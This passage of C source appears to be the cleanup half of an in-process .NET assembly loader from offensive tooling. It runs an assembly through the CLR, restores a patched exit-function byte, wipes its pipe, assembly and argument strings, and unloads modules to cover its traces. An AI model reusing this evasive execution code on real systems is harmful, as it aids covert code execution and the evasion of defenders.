            Hrs = Clr.EN->lpVtbl->Invoke_3( Clr.EN, Clr.V1, Clr.PR, &Clr.V2 );
            if ( Hrs != S_OK )
            {
                PipePrint( &Api, Log, "[-] .NET Runtime Error: %lx\n", Hrs );
                goto cleanup;
            };
            Api.SafeArrayDestroy( Clr.PR );
        };
    };

cleanup:
    if ( OrigData != NULL )
    {
        NumBytes = 1;
        if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &BaseIPtr, &NumBytes, PAGE_READWRITE, &OldProtA ) ) )
        {
            *( byte* )ExitIPtr = OrigData;
            Api.NtProtectVirtualMemory( NtCurrentProcess(), &BaseIPtr, &NumBytes, OldProtA, &OldProtB );
        };
    };

    if ( PipStr != NULL )
    {
        RtlSecureZeroMemory( PipStr, PipSiz );
        Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                        0,
                        PipStr
                        );
        PipStr = NULL;
#ifdef _VERBOSE
        PipePrint( &Api, Log, "[-] Pipe string wiped in cleanup\n" );
#endif
    };

    if ( LenStr != NULL )
    {
        RtlSecureZeroMemory( LenStr, LenSiz );
        Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                        0,
                        LenStr
                        );
        LenStr = NULL;
#ifdef _VERBOSE
        PipePrint( &Api, Log, "[-] Length string wiped in cleanup\n" );
#endif
    };

    if ( AsmStr != NULL )
    {
        RtlSecureZeroMemory( AsmStr, AsmSiz );
        Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                        0,
                        AsmStr
                        );
        AsmStr = NULL;
#ifdef _VERBOSE
        PipePrint( &Api, Log, "[-] Assembly string wiped in cleanup\n" );
#endif
    };

    if ( ArgStr != NULL )
    {
        RtlSecureZeroMemory( ArgStr, ArgSiz );
        Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                        0,
                        ArgStr
                        );
        ArgStr = NULL;
#ifdef _VERBOSE
        PipePrint( &Api, Log, "[-] Arguments string wiped in cleanup\n" );
#endif
    };

    if ( ModuleName != NULL )
    {
        RtlSecureZeroMemory( ModuleName, _MAX_FNAME );
        Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                        0,
                        ModuleName
                        );
        ModuleName = NULL;
#ifdef _VERBOSE
        PipePrint( &Api, Log, "[-] Module name string wiped in cleanup\n" );
#endif
    };
    if ( AppDomain != NULL )
    {
        RtlSecureZeroMemory( AppDomain, _MAX_FNAME );
        Api.RtlFreeHeap( NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap,
                        0,
                        AppDomain
                        );
        AppDomain = NULL;
#ifdef _VERBOSE
        PipePrint( &Api, Log, "[-] Appdomain name string wiped in cleanup\n" );
#endif
    };

    if ( header != NULL && header[0] != 0x00  )
    {
        RtlSecureZeroMemory( header, sizeof( header ) );
#ifdef _VERBOSE
        PipePrint( &Api, Log, "[-] Header bytes wiped in cleanup\n" );
#endif
    };
    if ( netv4 != NULL && netv4[0] != 0x00 )
    {
        RtlSecureZeroMemory( netv4, sizeof( netv4 ) );
#ifdef _VERBOSE
        PipePrint( &Api, Log, "[-] .NET version string wiped in cleanup\n" );
#endif
    };

    if ( Clr.EN )
    {
        Clr.EN->lpVtbl->Release( Clr.EN );
    };
    if ( Clr.AS )
    {
        Clr.AS->lpVtbl->Release( Clr.AS );
    };
    if ( Clr.MS )
    {
        Clr.MS->lpVtbl->Release( Clr.MS );
    };
    if ( Clr.AD )
    {
        Clr.AD->lpVtbl->Release( Clr.AD );
    };
    if ( Clr.DA )
    {
        Clr.DA->lpVtbl->Release( Clr.DA );
    };
    if ( Clr.RH )
    {
        Clr.RH->lpVtbl->UnloadDomain( Clr.RH, Clr.DA );
    };
    if ( Clr.RI )
    {
        Clr.RI->lpVtbl->Release( Clr.RI );
    };
    if ( Clr.MH )
    {
        Clr.MH->lpVtbl->Release( Clr.MH );
    };

    if ( OLd && Ole != NULL )
    {
        Nst = Api.LdrUnloadDll( Ole );
    };
    if ( SLd && Shl != NULL )
    {
        Nst = Api.LdrUnloadDll( Shl );
    };
    if ( VLd && Mvc != NULL )
    {
        Nst = Api.LdrUnloadDll( Mvc );
    };
    if ( MLd && Msc != NULL ) 
    {
        Nst = Api.LdrUnloadDll( Msc );
    };
    if ( ULd && U32 != NULL )
    {
        Nst = Api.LdrUnloadDll( U32 );   
    };

    if ( Ols.Exit != NULL )
    {
        Api.SysFreeString( Ols.Exit );
#ifdef _VERBOSE
            PipePrint( &Api, Log, "[-] Exit string cleared in cleanup\n" );
#endif
    };
    if ( Ols.GetFunctionPointer != NULL )
    {
        Api.SysFreeString( Ols.GetFunctionPointer );
#ifdef _VERBOSE
            PipePrint( &Api, Log, "[-] GetFunctionPointer string cleared in cleanup\n" );
#endif
    };
    if ( Ols.MethodInfo != NULL )
    {
        Api.SysFreeString( Ols.MethodInfo );
#ifdef _VERBOSE
            PipePrint( &Api, Log, "[-] MethodInfo string cleared in cleanup\n" );
#endif
    };
    if ( Ols.Mscorlib != NULL )
    {
        Api.SysFreeString( Ols.Mscorlib );
#ifdef _VERBOSE
            PipePrint( &Api, Log, "[-] Mscorlib string cleared in cleanup\n" );
#endif
    };
    if ( Ols.System_Environment != NULL )
    {
        Api.SysFreeString( Ols.System_Environment );
#ifdef _VERBOSE
            PipePrint( &Api, Log, "[-] System_Environment string cleared in cleanup\n" );
#endif
    };
    if ( Ols.System_Reflection_MethodInfo != NULL )
    {
        Api.SysFreeString( Ols.System_Reflection_MethodInfo );
#ifdef _VERBOSE
            PipePrint( &Api, Log, "[-] System_Reflection_MethodInfo string cleared in cleanup\n" );
#endif
    };
    if ( Ols.System_RuntimeMethodHandle != NULL )
    {
        Api.SysFreeString( Ols.System_RuntimeMethodHandle );
#ifdef _VERBOSE
            PipePrint( &Api, Log, "[-] System_RuntimeMethodHandle string cleared in cleanup\n" );
#endif
    };

#ifdef _VERBOSE
    PipePrint( &Api, Log, "[+] Execution complete\n" );
#endif

    if ( Wnd != NULL )
    {
        Api.WaitForSingleObject( NtCurrentThread(), 1000 );
        Api.FreeConsole();
    };
    if ( Out != INVALID_HANDLE_VALUE )
    {
        Api.WaitForSingleObject( NtCurrentThread(), 1000 );
        Api.SetStdHandle( STD_OUTPUT_HANDLE, Out );
    };
    if ( Log != INVALID_HANDLE_VALUE )
    {
        Api.WaitForSingleObject( NtCurrentThread(), 1000 );
        Api.NtClose( Log );
    };

    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    RtlSecureZeroMemory( &Ols, sizeof( Ols ) );
    RtlSecureZeroMemory( &Clr, sizeof( Clr ) );
    RtlSecureZeroMemory( &Api, sizeof( Api ) );

    return;
};
